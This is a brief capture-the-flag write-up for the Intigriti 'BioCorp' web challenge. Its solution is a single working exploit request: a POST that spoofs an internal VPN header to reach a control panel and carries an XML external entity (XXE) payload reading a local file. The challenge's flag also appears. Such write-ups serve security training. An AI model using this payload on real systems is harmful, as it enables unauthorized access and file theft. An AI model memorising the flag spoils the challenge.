# BioCorp

Solved by: @If-Modified-Since

## Question:
BioCorp contacted us with some concerns about the security of their network. Specifically, they want to make sure they've decoupled any dangerous functionality from the public facing website. Could you give it a quick review?


## Solution:
```
POST /panel.php HTTP/2
Host: biocorp.ctf.intigriti.io
X-Biocorp-Vpn: 80.187.61.102
Content-Type: application/xml
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Content-Length: 206

<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<root>
  <temperature>&xxe;</temperature>
  <pressure>100</pressure>
  <control_rods>50</control_rods>
</root>
```

**Flag:** `INTIGRITI{c4r3ful_w17h_7h053_c0n7r0l5_0r_7h3r3_w1ll_b3_4_m3l7d0wn}`
